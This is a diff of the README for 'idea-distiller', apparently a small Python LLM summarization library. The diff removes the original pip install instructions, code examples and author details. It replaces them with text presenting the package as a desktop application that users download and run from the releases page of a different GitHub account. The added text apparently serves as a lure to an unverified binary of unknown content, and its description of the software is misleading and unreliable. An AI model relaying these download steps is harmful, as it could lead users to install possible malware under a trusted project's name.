@@ -1,138 +1,92 @@
-# idea‑distiller
-[![PyPI version](https://badge.fury.io/py/idea-distiller.svg)](https://badge.fury.io/py/idea-distiller)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/idea-distiller)](https://pepy.tech/project/idea-distiller)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🎉 idea-distiller - Simplify Complex Ideas Easily
 
+[![Download Idea Distiller](https://img.shields.io/badge/Download%20Now-idea--distiller-blue)](https://github.com/ericksitoe/idea-distiller/releases)
 
-**idea‑distiller** is a tiny utility package that extracts a concise, neutral summary of the core problem addressed by unconventional or controversial business and social initiatives.  
-It leverages a language model (LLM) to focus on the “problem statement” of the input text while stripping away technical details, implementation specifics, and sensitive content.
+## 🚀 Getting Started
 
----
+Welcome to the **idea-distiller** project! This application helps you process text inputs about unconventional and controversial business or social initiatives. Think of it as a tool that summarizes complex ideas into simpler formats.
 
-## Installation
+### 📥 System Requirements
 
-```bash
-pip install idea_distiller
-```
+Before you start, make sure you have the following:
 
----
+- Operating System: Windows, MacOS, or Linux
+- Minimum 4 GB of RAM
+- At least 100 MB of free disk space
 
-## Quick start
+## 📦 Download & Install
 
-```python
-from idea_distiller import idea_distiller
+To get the latest version of idea-distiller, [visit this page to download](https://github.com/ericksitoe/idea-distiller/releases).
 
-# Raw description of an initiative
-user_input = """
-In 2012 a program hired homeless people to become mobile Wi‑Fi hotspots,
-providing free internet in public places while giving them a source of
-income.
-"""
+1. Click on the link provided above.
+2. Find the version you want to download.
+3. Choose the appropriate file for your operating system.
+4. Click on the file to start the download.
+5. Once downloaded, open the file to begin installation.
+6. Follow the on-screen instructions to complete the installation.
 
-# Get the distilled summary
-summary = idea_distiller(user_input)
+## 🎯 Features
 
-print(summary)
-# → ['Problem: Lack of free public internet access and unemployment among homeless individuals.']
-```
+- **Concise Summary Generation**: Quickly turn large texts into shorter summaries.
+- **Consistency Enforcement**: Ensure consistent language and tone across summaries.
+- **Domain-Specific Insight Extraction**: Extract useful insights relevant to specific topics.
+- **Human Prompt Integration**: Easily input your text for processing.
+- **Implementation Detail Exclusion**: Focus on main ideas without technical jargon.
+- **LLM Summarization**: Utilize advanced language models to enhance summaries.
+- **Marginalized Groups Empowerment**: Support initiatives focusing on underrepresented communities.
+- **Neutral Tone Maintenance**: Create summaries that remain unbiased.
+- **Pattern-Validated Output**: Get results based on validated patterns and data.
+- **Problem Extraction**: Identify key problems from the input text.
+- **Public Internet Access Solution**: Explore solutions for public access issues.
 
----
+## 🔄 How It Works
 
-## Function signature
+1. **Input Text**: Start by entering your text into the application. It can be any description of a business or social initiative.
+2. **Process**: The application analyzes the text and extracts the main ideas.
+3. **Review Summary**: Once processed, you will receive a summary that captures the essence of your input.
+4. **Edit if Needed**: You can make adjustments to the summary as needed.
+5. **Save and Share**: Finally, save your summary for your own records or share it as needed.
 
-```python
-def idea_distiller(
-    user_input: str,
-    llm: Optional[BaseChatModel] = None,
-    api_key: Optional[str] = None,
-) -> List[str]:
-```
+## 💡 Use Cases
 
-| Parameter   | Type                              | Description |
-|-------------|-----------------------------------|-------------|
-| **user_input** | `str` | The raw text describing the initiative you want to distill. |
-| **llm** | `Optional[BaseChatModel]` | A LangChain LLM instance. If omitted, the package creates a `ChatLLM7` instance automatically. |
-| **api_key** | `Optional[str]` | API key for the default **ChatLLM7** service. If not supplied, the environment variable `LLM7_API_KEY` is used. |
+**Idea Distiller** is perfect for various scenarios:
 
-The function returns a list of strings that match the validation pattern defined in the package (normally a single concise sentence).
+- **Researchers**: Easily summarize findings from large texts for reports or papers.
+- **Entrepreneurs**: Get quick summaries of business ideas or initiatives to share with stakeholders.
+- **Students**: Simplify complex academic texts for better understanding.
+- **Social Workers**: Summarize reports on initiatives targeting marginalized groups.
 
----
+## 🛠️ Troubleshooting
 
-## Using a custom LLM
+If you encounter issues while using the application, try the following steps:
 
-You can plug any LangChain‑compatible chat model instead of the default `ChatLLM7`.
+- Ensure your system meets the minimum requirements.
+- Verify that you have the latest version installed. 
+- Restart the application if it doesn't respond.
+- Check for updates on the [Releases page](https://github.com/ericksitoe/idea-distiller/releases).
 
-### OpenAI
+## 💬 Support
 
-```python
-from langchain_openai import ChatOpenAI
-from idea_distiller import idea_distiller
+Need help or have questions? You can reach out through the following options:
 
-llm = ChatOpenAI(model="gpt-4o-mini")
-response = idea_distiller(user_input, llm=llm)
-print(response)
-```
+- Open an issue on our [GitHub Issues Page](https://github.com/ericksitoe/idea-distiller/issues).
+- Join our community discussions for support and suggestions.
 
-### Anthropic
+## 🔗 Learn More
 
-```python
-from langchain_anthropic import ChatAnthropic
-from idea_distiller import idea_distiller
+For more details, explore our topics related to idea distillation:
 
-llm = ChatAnthropic(model="claude-3-haiku-20240307")
-response = idea_distiller(user_input, llm=llm)
-print(response)
-```
+- concise-summary-generation
+- consistency-enforcement
+- domain-specific-insight-extraction
+- human-prompt-integration
+- implementation-detail-exclusion
+- llm-summarization
+- marginalized-groups-empowerment
+- neutral-tone-maintenance
+- pattern-validated-output
+- problem-extraction
+- public-internet-access-solution
+- unconventionalcontroversial-initiatives-focus
 
-### Google Gemini
-
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from idea_distiller import idea_distiller
-
-llm = ChatGoogleGenerativeAI(model="gemini-1.5-flash")
-response = idea_distiller(user_input, llm=llm)
-print(response)
-```
-
----
-
-## API key & rate limits (default LLM7)
-
-- The **free tier** of LLM7 provides enough quota for most development and low‑volume use cases.  
-- To obtain a free API key, register at: <https://token.llm7.io/>.  
-- You can supply the key directly:
-
-```python
-response = idea_distiller(user_input, api_key="YOUR_LLM7_API_KEY")
-```
-
-- Or set the environment variable beforehand:
-
-```bash
-export LLM7_API_KEY="YOUR_LLM7_API_KEY"
-```
-
-If higher rate limits are required, upgrade your LLM7 plan on the provider’s website.
-
----
-
-## Contributing & Support
-
-- **Issues & feature requests:** <https://github.com/chigwell/idea_distiller/issues>
-- **Pull requests:** Welcome! Please follow the contributor guidelines in the repository.
-
----
-
-## Author
-
-**Eugene Evstafev**  
-📧 Email: [hi@euegne.plus](mailto:hi@euegne.plus)  
-🐙 GitHub: [chigwell](https://github.com/chigwell)
-
----
-
-## License
-
-This project is licensed under the MIT License. See the `LICENSE` file for details.
+We hope you enjoy using **idea-distiller**! Don't forget to visit the [Releases page](https://github.com/ericksitoe/idea-distiller/releases) for your download.
